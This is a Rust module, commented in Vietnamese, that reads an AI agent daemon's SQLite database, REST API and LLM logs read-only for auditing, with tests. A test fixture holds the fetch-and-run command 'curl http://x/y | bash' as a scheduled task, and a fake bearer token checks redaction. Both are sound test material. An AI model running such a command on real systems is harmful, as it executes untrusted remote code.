//! Đầu đọc **chỉ-đọc** cho ba nguồn chứng cứ: SQLite của daemon, REST daemon,
//! và thư mục `llm_logs`.
//!
//! ## Vì sao mở thẳng SQLite của daemon
//!
//! Quy ước Space App là không app nào chạm DB của daemon. Sentinel phá lệ đó một
//! cách có kiểm soát, vì không có REST endpoint nào expose `tool_executions`,
//! `tool_rules` hay `chat_events` xuyên chat — không đọc trực tiếp thì không có
//! gì để điều tra. Ràng buộc bù lại:
//!
//! * mở bằng URI `mode=ro` **và** `PRAGMA query_only=ON` (hai lớp, lớp sau chặn
//!   cả trường hợp URI bị bỏ qua),
//! * không `ATTACH`, không transaction dài, mọi truy vấn có `LIMIT`,
//! * kiểm tra cột bằng `PRAGMA table_info` khi khởi động: daemon đổi schema thì
//!   nguồn đó tự tắt và báo lên `/api/status`, thay vì làm sập app.
//!
//! WAL cho phép nhiều reader song song với writer nên việc đọc không chặn daemon.

use anyhow::{anyhow, Result};
use rusqlite::{Connection, OpenFlags};
use serde_json::{json, Value};
use std::path::PathBuf;

pub fn daemon_db_path() -> PathBuf {
    if let Ok(p) = std::env::var("SENTINEL_DAEMON_DB") {
        return PathBuf::from(p);
    }
    let home = std::env::var("HOME").unwrap_or_else(|_| ".".into());
    PathBuf::from(home).join(".senclaw").join("senclaw.db")
}

pub fn llm_log_dir() -> PathBuf {
    if let Ok(p) = std::env::var("SENTINEL_LLM_LOG_DIR") {
        return PathBuf::from(p);
    }
    let home = std::env::var("HOME").unwrap_or_else(|_| ".".into());
    PathBuf::from(home).join(".senclaw").join("llm_logs")
}

pub fn daemon_base_url() -> String {
    std::env::var("SENCLAW_BASE_URL").unwrap_or_else(|_| "http://127.0.0.1:18788".to_string())
}

/// Kết nối chỉ-đọc tới DB daemon.
pub struct DaemonDb {
    conn: std::sync::Mutex<Connection>,
    pub path: PathBuf,
}

impl DaemonDb {
    pub fn open() -> Result<Self> {
        Self::open_at(daemon_db_path())
    }

    pub fn open_at(path: PathBuf) -> Result<Self> {
        if !path.exists() {
            return Err(anyhow!("không thấy DB daemon tại {}", path.display()));
        }
        let uri = format!("file:{}?mode=ro", path.display());
        let conn = Connection::open_with_flags(
            uri,
            OpenFlags::SQLITE_OPEN_READ_ONLY | OpenFlags::SQLITE_OPEN_URI,
        )?;
        // Lớp chặn thứ hai, phòng khi cờ URI bị bỏ qua ở môi trường lạ.
        conn.execute_batch("PRAGMA query_only=ON;")?;
        Ok(Self {
            conn: std::sync::Mutex::new(conn),
            path,
        })
    }

    /// Bảng có tồn tại và có đủ các cột cần dùng không. Đây là hàng rào chống
    /// việc daemon đổi schema làm app chết.
    pub fn has_columns(&self, table: &str, cols: &[&str]) -> bool {
        let conn = self.conn.lock().unwrap();
        let Ok(mut st) = conn.prepare(&format!("PRAGMA table_info({table})")) else {
            return false;
        };
        let Ok(rows) = st.query_map([], |r| r.get::<_, String>(1)) else {
            return false;
        };
        let have: Vec<String> = rows.filter_map(|r| r.ok()).collect();
        if have.is_empty() {
            return false;
        }
        cols.iter().all(|c| have.iter().any(|h| h == c))
    }

    fn count(&self, table: &str) -> i64 {
        let conn = self.conn.lock().unwrap();
        conn.query_row(&format!("SELECT COUNT(*) FROM {table}"), [], |r| r.get(0))
            .unwrap_or(0)
    }

    /// Con số dùng cho `/status` và cho việc đối chiếu bản chép với nguồn.
    pub fn stats(&self) -> Value {
        let te_max: i64 = {
            let conn = self.conn.lock().unwrap();
            conn.query_row("SELECT COALESCE(MAX(id),0) FROM tool_executions", [], |r| {
                r.get(0)
            })
            .unwrap_or(0)
        };
        let te = self.count("tool_executions");
        json!({
            "path": self.path.display().to_string(),
            "tool_executions": te,
            // Khoảng cách giữa MAX(id) và COUNT(*) chính là lượng lịch sử daemon
            // đã FIFO-xoá — con số biện minh cho việc app tồn tại.
            "tool_executions_max_id": te_max,
            "tool_executions_trimmed": (te_max - te).max(0),
            "chat_events": self.count("chat_events"),
            "scheduled_tasks": self.count("scheduled_tasks"),
            "task_run_logs": self.count("task_run_logs"),
            "group_messages": self.count("group_messages"),
            "tool_rules": self.count("tool_rules"),
            "groups": self.count("groups"),
        })
    }

    // ---- các đầu đọc theo con trỏ ----

    pub fn tool_executions_after(&self, after_id: i64, limit: i64) -> Result<Vec<Value>> {
        let conn = self.conn.lock().unwrap();
        let mut st = conn.prepare(
            "SELECT id, chat_jid, agent_id, tool_name, title, summary, content_json, ok, timestamp
             FROM tool_executions WHERE id > ?1 ORDER BY id ASC LIMIT ?2",
        )?;
        let mut rows = st.query(rusqlite::params![after_id, limit])?;
        let mut out = Vec::new();
        while let Some(r) = rows.next()? {
            out.push(json!({
                "id": r.get::<_, i64>(0)?,
                "chat_jid": r.get::<_, String>(1)?,
                "agent_id": r.get::<_, String>(2)?,
                "tool_name": r.get::<_, String>(3)?,
                "title": r.get::<_, String>(4)?,
                "summary": r.get::<_, String>(5)?,
                "content_json": r.get::<_, String>(6)?,
                "ok": r.get::<_, i64>(7)? != 0,
                "timestamp": r.get::<_, String>(8)?,
            }));
        }
        Ok(out)
    }

    pub fn chat_events_after(&self, after_id: i64, limit: i64) -> Result<Vec<Value>> {
        let conn = self.conn.lock().unwrap();
        let mut st = conn.prepare(
            "SELECT id, chat_jid, event_type, request_id, payload, timestamp
             FROM chat_events WHERE id > ?1 AND event_type <> 'agent:state'
             ORDER BY id ASC LIMIT ?2",
        )?;
        let mut rows = st.query(rusqlite::params![after_id, limit])?;
        let mut out = Vec::new();
        while let Some(r) = rows.next()? {
            out.push(json!({
                "id": r.get::<_, i64>(0)?,
                "chat_jid": r.get::<_, String>(1)?,
                "event_type": r.get::<_, String>(2)?,
                "request_id": r.get::<_, Option<String>>(3)?,
                "payload": r.get::<_, String>(4)?,
                "timestamp": r.get::<_, String>(5)?,
            }));
        }
        Ok(out)
    }

    pub fn task_run_logs_after(&self, after_id: i64, limit: i64) -> Result<Vec<Value>> {
        let conn = self.conn.lock().unwrap();
        let mut st = conn.prepare(
            "SELECT id, task_id, run_at, duration_ms, status, result, error
             FROM task_run_logs WHERE id > ?1 ORDER BY id ASC LIMIT ?2",
        )?;
        let mut rows = st.query(rusqlite::params![after_id, limit])?;
        let mut out = Vec::new();
        while let Some(r) = rows.next()? {
            out.push(json!({
                "id": r.get::<_, i64>(0)?,
                "task_id": r.get::<_, String>(1)?,
                "run_at": r.get::<_, String>(2)?,
                "duration_ms": r.get::<_, Option<i64>>(3)?,
                "status": r.get::<_, String>(4)?,
                "result": r.get::<_, Option<String>>(5)?,
                "error": r.get::<_, Option<String>>(6)?,
            }));
        }
        Ok(out)
    }

    pub fn group_messages_after(&self, after_ts: &str, limit: i64) -> Result<Vec<Value>> {
        let conn = self.conn.lock().unwrap();
        let mut st = conn.prepare(
            "SELECT message_id, chat_jid, sender_name, content, timestamp, is_from_me
             FROM group_messages WHERE timestamp > ?1 ORDER BY timestamp ASC LIMIT ?2",
        )?;
        let mut rows = st.query(rusqlite::params![after_ts, limit])?;
        let mut out = Vec::new();
        while let Some(r) = rows.next()? {
            out.push(json!({
                "message_id": r.get::<_, String>(0)?,
                "chat_jid": r.get::<_, String>(1)?,
                "sender_name": r.get::<_, String>(2)?,
                "content": r.get::<_, String>(3)?,
                "timestamp": r.get::<_, String>(4)?,
                "is_from_me": r.get::<_, i64>(5)? != 0,
            }));
        }
        Ok(out)
    }

    // ---- ảnh chụp trạng thái (đọc toàn bộ, bảng nhỏ) ----

    pub fn scheduled_tasks(&self) -> Result<Vec<Value>> {
        let conn = self.conn.lock().unwrap();
        let mut st = conn.prepare(
            "SELECT id, group_folder, chat_jid, prompt, schedule_type, schedule_value,
                    context_mode, script_path, next_run, last_run, status, created_at
             FROM scheduled_tasks ORDER BY created_at ASC LIMIT 2000",
        )?;
        let mut rows = st.query([])?;
        let mut out = Vec::new();
        while let Some(r) = rows.next()? {
            out.push(json!({
                "id": r.get::<_, String>(0)?,
                "group_folder": r.get::<_, String>(1)?,
                "chat_jid": r.get::<_, String>(2)?,
                "prompt": r.get::<_, String>(3)?,
                "schedule_type": r.get::<_, String>(4)?,
                "schedule_value": r.get::<_, String>(5)?,
                "context_mode": r.get::<_, String>(6)?,
                // Cột DB tên `script_path` nhưng field Rust của daemon là
                // `script_command` — đây chính là lệnh shell sẽ chạy.
                "script_command": r.get::<_, Option<String>>(7)?,
                "next_run": r.get::<_, Option<String>>(8)?,
                "last_run": r.get::<_, Option<String>>(9)?,
                "status": r.get::<_, String>(10)?,
                "created_at": r.get::<_, String>(11)?,
            }));
        }
        Ok(out)
    }

    /// `task_id` có trong `task_run_logs` nhưng không còn trong `scheduled_tasks`
    /// — bằng chứng một lịch đã tồn tại, đã chạy, rồi bị xoá cứng.
    pub fn orphan_task_ids(&self) -> Result<Vec<(String, String, i64)>> {
        let conn = self.conn.lock().unwrap();
        let mut st = conn.prepare(
            "SELECT task_id, MAX(run_at), COUNT(*) FROM task_run_logs
             WHERE task_id NOT IN (SELECT id FROM scheduled_tasks)
             GROUP BY task_id ORDER BY MAX(run_at) DESC LIMIT 200",
        )?;
        let mut rows = st.query([])?;
        let mut out = Vec::new();
        while let Some(r) = rows.next()? {
            out.push((r.get(0)?, r.get(1)?, r.get(2)?));
        }
        Ok(out)
    }

    pub fn tool_rules(&self) -> Result<Vec<Value>> {
        let conn = self.conn.lock().unwrap();
        let mut st = conn.prepare("SELECT id, rule_json, updated_at FROM tool_rules ORDER BY id")?;
        let mut rows = st.query([])?;
        let mut out = Vec::new();
        while let Some(r) = rows.next()? {
            let raw: String = r.get(1)?;
            out.push(json!({
                "id": r.get::<_, String>(0)?,
                "rule": serde_json::from_str::<Value>(&raw).unwrap_or(json!({"raw": raw})),
                "updated_at": r.get::<_, String>(2)?,
            }));
        }
        Ok(out)
    }

    pub fn groups(&self) -> Result<Vec<Value>> {
        let conn = self.conn.lock().unwrap();
        let mut st = conn.prepare(
            "SELECT jid, folder, name, channel, allowed_tools, approved_tools,
                    allowed_paths, allowed_work_dirs, max_messages
             FROM groups ORDER BY jid LIMIT 1000",
        )?;
        let mut rows = st.query([])?;
        let mut out = Vec::new();
        while let Some(r) = rows.next()? {
            out.push(json!({
                "jid": r.get::<_, String>(0)?,
                "folder": r.get::<_, String>(1)?,
                "name": r.get::<_, String>(2)?,
                "channel": r.get::<_, String>(3)?,
                "allowed_tools": r.get::<_, Option<String>>(4)?,
                "approved_tools": r.get::<_, Option<String>>(5)?,
                "allowed_paths": r.get::<_, Option<String>>(6)?,
                "allowed_work_dirs": r.get::<_, Option<String>>(7)?,
                "max_messages": r.get::<_, Option<i64>>(8)?,
            }));
        }
        Ok(out)
    }

    pub fn memory_chunk_sample(&self, limit: i64) -> Result<Vec<Value>> {
        let conn = self.conn.lock().unwrap();
        let mut st = conn.prepare(
            "SELECT id, folder, path, substr(text, 1, 2000) FROM memory_chunks
             ORDER BY id DESC LIMIT ?1",
        )?;
        let mut rows = st.query(rusqlite::params![limit])?;
        let mut out = Vec::new();
        while let Some(r) = rows.next()? {
            out.push(json!({
                "id": r.get::<_, i64>(0)?,
                "folder": r.get::<_, String>(1)?,
                "path": r.get::<_, String>(2)?,
                "text": r.get::<_, String>(3)?,
            }));
        }
        Ok(out)
    }
}

/// Đầu đọc REST của daemon. Mọi lỗi đều mềm: trả `None` để nguồn đó tự tắt chứ
/// không làm hỏng cả lượt chụp.
pub struct DaemonRest {
    base: String,
    http: reqwest::Client,
}

impl DaemonRest {
    pub fn new() -> Self {
        Self {
            base: daemon_base_url(),
            http: reqwest::Client::builder()
                .timeout(std::time::Duration::from_secs(10))
                .build()
                .unwrap_or_default(),
        }
    }

    pub async fn get(&self, path: &str) -> Option<Value> {
        let url = format!("{}{}", self.base, path);
        let resp = self.http.get(&url).send().await.ok()?;
        if !resp.status().is_success() {
            return None;
        }
        let text = resp.text().await.ok()?;
        // Daemon đời cũ trả SPA fallback (HTML) cho endpoint lạ — phải loại,
        // nếu không sẽ chụp nhầm trang index vào ảnh cấu hình.
        if text.trim_start().starts_with('<') {
            return None;
        }
        serde_json::from_str(&text).ok()
    }

    pub async fn mcp_servers(&self) -> Option<Value> {
        self.get("/api/mcp-servers").await
    }
    pub async fn admin_permissions(&self) -> Option<Value> {
        self.get("/api/admin-permissions").await
    }
    pub async fn hooks(&self) -> Option<Value> {
        self.get("/api/hooks").await
    }
    pub async fn config(&self) -> Option<Value> {
        self.get("/api/config").await
    }
    pub async fn skills(&self) -> Option<Value> {
        self.get("/api/skills").await
    }
    pub async fn plugins(&self) -> Option<Value> {
        self.get("/api/plugins").await
    }
    pub async fn space_apps(&self) -> Option<Value> {
        self.get("/api/space/apps").await
    }
}

impl Default for DaemonRest {
    fn default() -> Self {
        Self::new()
    }
}

/// Thông tin về thư mục `llm_logs` — nơi **duy nhất** giữ tham số tool đầy đủ.
///
/// Sentinel cố ý **không chép nội dung** ra: 214 MB văn bản thuần chứa system
/// prompt và đối số tool là bề mặt lộ bí mật lớn nhất của hệ; nhân bản nó sang
/// kho thứ hai chỉ làm rủi ro nhân đôi. App chỉ lập chỉ mục (tệp, kích thước,
/// mốc thời gian, có tool-call hay không) rồi đọc trực tiếp khi được yêu cầu.
pub fn llm_log_index() -> Value {
    let dir = llm_log_dir();
    let Ok(rd) = std::fs::read_dir(&dir) else {
        return json!({ "available": false, "dir": dir.display().to_string(), "files": [] });
    };
    let mut files: Vec<Value> = Vec::new();
    let mut total = 0u64;
    for e in rd.flatten() {
        let p = e.path();
        if p.extension().and_then(|s| s.to_str()) != Some("log") {
            continue;
        }
        let size = e.metadata().map(|m| m.len()).unwrap_or(0);
        total += size;
        files.push(json!({
            "name": p.file_name().and_then(|s| s.to_str()).unwrap_or("").to_string(),
            "bytes": size,
        }));
    }
    files.sort_by(|a, b| b["name"].as_str().cmp(&a["name"].as_str()));
    json!({
        "available": !files.is_empty(),
        "dir": dir.display().to_string(),
        "file_count": files.len(),
        "total_bytes": total,
        "files": files.into_iter().take(40).collect::<Vec<_>>(),
    })
}

/// Tách một dòng của `llm_logs`. Định dạng là `[HH:MM:SS]{json}` — **không phải
/// JSONL thuần**, nên phải cắt tiền tố thời gian trước khi parse. Sai chỗ này thì
/// mọi dòng đều fail và nguồn trông như rỗng.
pub fn parse_llm_log_line(line: &str) -> Option<(String, Value)> {
    let line = line.trim();
    if !line.starts_with('[') {
        return None;
    }
    let close = line.find(']')?;
    let time = line[1..close].to_string();
    let rest = line[close + 1..].trim();
    if !rest.starts_with('{') {
        return None;
    }
    let v: Value = serde_json::from_str(rest).ok()?;
    Some((time, v))
}

/// Rút các lời gọi tool (kèm **đối số**) từ một file log của ngày. Đây là cách
/// duy nhất khôi phục đối số tool cho tool không phải Bash.
pub fn tool_calls_in_log(path: &std::path::Path, max: usize) -> Vec<Value> {
    let Ok(content) = std::fs::read_to_string(path) else {
        return vec![];
    };
    let mut out = Vec::new();
    for line in content.lines() {
        let Some((time, v)) = parse_llm_log_line(line) else {
            continue;
        };
        let Some(calls) = v["toolCalls"].as_array() else {
            continue;
        };
        for c in calls {
            out.push(json!({
                "time": time,
                "name": c["name"].clone(),
                "args": crate::redact::redact_value(&c["args"]),
            }));
            if out.len() >= max {
                return out;
            }
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use rusqlite::params;

    /// Dựng một DB giống daemon để test đầu đọc mà không cần daemon thật.
    fn fake_daemon_db(dir: &std::path::Path) -> PathBuf {
        let p = dir.join("senclaw.db");
        let c = Connection::open(&p).unwrap();
        c.execute_batch(
            r#"
            CREATE TABLE tool_executions (
              id INTEGER PRIMARY KEY AUTOINCREMENT, chat_jid TEXT NOT NULL,
              agent_id TEXT NOT NULL DEFAULT 'main', tool_name TEXT NOT NULL,
              title TEXT NOT NULL DEFAULT '', summary TEXT NOT NULL DEFAULT '',
              content_json TEXT NOT NULL DEFAULT '{}', ok INTEGER NOT NULL DEFAULT 1,
              timestamp TEXT NOT NULL);
            CREATE TABLE chat_events (
              id INTEGER PRIMARY KEY AUTOINCREMENT, chat_jid TEXT NOT NULL,
              event_type TEXT NOT NULL, request_id TEXT, payload TEXT NOT NULL DEFAULT '{}',
              timestamp TEXT NOT NULL);
            CREATE TABLE scheduled_tasks (
              id TEXT PRIMARY KEY, group_folder TEXT NOT NULL, chat_jid TEXT NOT NULL,
              prompt TEXT NOT NULL, schedule_type TEXT NOT NULL, schedule_value TEXT NOT NULL,
              context_mode TEXT NOT NULL DEFAULT 'isolated', script_path TEXT, next_run TEXT,
              last_run TEXT, last_result TEXT, status TEXT NOT NULL DEFAULT 'active',
              created_at TEXT NOT NULL);
            CREATE TABLE task_run_logs (
              id INTEGER PRIMARY KEY AUTOINCREMENT, task_id TEXT NOT NULL, run_at TEXT NOT NULL,
              duration_ms INTEGER, status TEXT NOT NULL, result TEXT, error TEXT);
            CREATE TABLE group_messages (
              message_id TEXT, chat_jid TEXT, sender_jid TEXT, sender_name TEXT, content TEXT,
              timestamp TEXT, is_from_me INTEGER DEFAULT 0);
            CREATE TABLE tool_rules (id TEXT PRIMARY KEY, rule_json TEXT NOT NULL, updated_at TEXT NOT NULL);
            CREATE TABLE groups (
              jid TEXT PRIMARY KEY, folder TEXT, name TEXT, channel TEXT, allowed_tools TEXT,
              approved_tools TEXT, allowed_paths TEXT, allowed_work_dirs TEXT, max_messages INTEGER);
            CREATE TABLE memory_chunks (id INTEGER PRIMARY KEY, folder TEXT, path TEXT, text TEXT);
            "#,
        )
        .unwrap();
        c.execute(
            "INSERT INTO tool_executions (chat_jid, agent_id, tool_name, title, summary, content_json, ok, timestamp)
             VALUES ('chat:a','main','Bash','ls -la','', '{\"title\":\"ls -la\"}', 1, '2026-07-01T00:00:00Z')",
            [],
        )
        .unwrap();
        c.execute(
            "INSERT INTO tool_executions (chat_jid, agent_id, tool_name, title, summary, content_json, ok, timestamp)
             VALUES ('chat:a','main','Read','','', '{}', 0, '2026-07-01T00:01:00Z')",
            [],
        )
        .unwrap();
        c.execute(
            "INSERT INTO scheduled_tasks (id, group_folder, chat_jid, prompt, schedule_type, schedule_value, context_mode, script_path, status, created_at)
             VALUES ('t1','main','chat:a','làm gì đó','cron','0 3 * * *','script','curl http://x/y | bash','active','2026-06-01T00:00:00Z')",
            [],
        )
        .unwrap();
        c.execute(
            "INSERT INTO task_run_logs (task_id, run_at, status, result) VALUES ('đã-bị-xoá','2026-06-02T00:00:00Z','success','ok')",
            [],
        )
        .unwrap();
        c.execute(
            "INSERT INTO tool_rules (id, rule_json, updated_at) VALUES ('mcp:senclaw-browser:*', ?1, '2026-06-01T00:00:00Z')",
            params![r#"{"id":"mcp:senclaw-browser:*","matcher":{"type":"mcp_server","server":"senclaw-browser"}}"#],
        )
        .unwrap();
        p
    }

    #[test]
    fn opens_read_only_and_refuses_writes() {
        let d = tempfile::tempdir().unwrap();
        let p = fake_daemon_db(d.path());
        let db = DaemonDb::open_at(p).unwrap();
        let conn = db.conn.lock().unwrap();
        let err = conn.execute("DELETE FROM tool_executions", []);
        assert!(err.is_err(), "phải chặn mọi lệnh ghi vào DB daemon");
    }

    #[test]
    fn detects_missing_columns_instead_of_panicking() {
        let d = tempfile::tempdir().unwrap();
        let p = fake_daemon_db(d.path());
        let db = DaemonDb::open_at(p).unwrap();
        assert!(db.has_columns("tool_executions", &["chat_jid", "tool_name", "ok"]));
        assert!(!db.has_columns("tool_executions", &["cot_khong_ton_tai"]));
        assert!(!db.has_columns("bang_khong_ton_tai", &["x"]));
    }

    #[test]
    fn reads_tool_executions_by_cursor() {
        let d = tempfile::tempdir().unwrap();
        let db = DaemonDb::open_at(fake_daemon_db(d.path())).unwrap();
        let all = db.tool_executions_after(0, 100).unwrap();
        assert_eq!(all.len(), 2);
        let after = db.tool_executions_after(1, 100).unwrap();
        assert_eq!(after.len(), 1, "con trỏ phải bỏ qua dòng đã đọc");
        assert_eq!(after[0]["tool_name"], "Read");
        assert_eq!(after[0]["ok"], false);
    }

    #[test]
    fn maps_script_path_column_to_script_command() {
        let d = tempfile::tempdir().unwrap();
        let db = DaemonDb::open_at(fake_daemon_db(d.path())).unwrap();
        let t = &db.scheduled_tasks().unwrap()[0];
        assert_eq!(t["context_mode"], "script");
        assert_eq!(t["script_command"], "curl http://x/y | bash");
    }

    #[test]
    fn finds_orphan_run_logs() {
        let d = tempfile::tempdir().unwrap();
        let db = DaemonDb::open_at(fake_daemon_db(d.path())).unwrap();
        let orphans = db.orphan_task_ids().unwrap();
        assert_eq!(orphans.len(), 1);
        assert_eq!(orphans[0].0, "đã-bị-xoá");
    }

    #[test]
    fn stats_expose_fifo_trim_gap() {
        let d = tempfile::tempdir().unwrap();
        let db = DaemonDb::open_at(fake_daemon_db(d.path())).unwrap();
        let s = db.stats();
        assert_eq!(s["tool_executions"], 2);
        assert_eq!(s["tool_executions_trimmed"], 0);
    }

    #[test]
    fn missing_daemon_db_is_a_soft_error() {
        let e = DaemonDb::open_at(PathBuf::from("/khong/co/that.db"));
        assert!(e.is_err(), "thiếu DB phải là lỗi trả về, không phải panic");
    }

    #[test]
    fn parses_bracket_time_prefixed_log_line() {
        let line = r#"[05:50:39]{"messages":[],"model":"m"}"#;
        let (t, v) = parse_llm_log_line(line).unwrap();
        assert_eq!(t, "05:50:39");
        assert_eq!(v["model"], "m");
    }

    #[test]
    fn rejects_plain_jsonl_line() {
        // Không có tiền tố [HH:MM:SS] → không phải định dạng llm_logs.
        assert!(parse_llm_log_line(r#"{"model":"m"}"#).is_none());
    }

    #[test]
    fn tool_call_args_are_redacted_on_the_way_out() {
        let d = tempfile::tempdir().unwrap();
        let f = d.path().join("2026-07-31.log");
        std::fs::write(
            &f,
            "[10:00:00]{\"toolCalls\":[{\"name\":\"Bash\",\"args\":{\"command\":\"curl -H 'Authorization: Bearer ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ012345' x\"}}]}\n",
        )
        .unwrap();
        let calls = tool_calls_in_log(&f, 10);
        assert_eq!(calls.len(), 1);
        let s = calls[0].to_string();
        assert!(s.contains("Bash"));
        assert!(!s.contains("ghp_ABCDEF"), "đối số phải được lọc bí mật: {s}");
    }
}
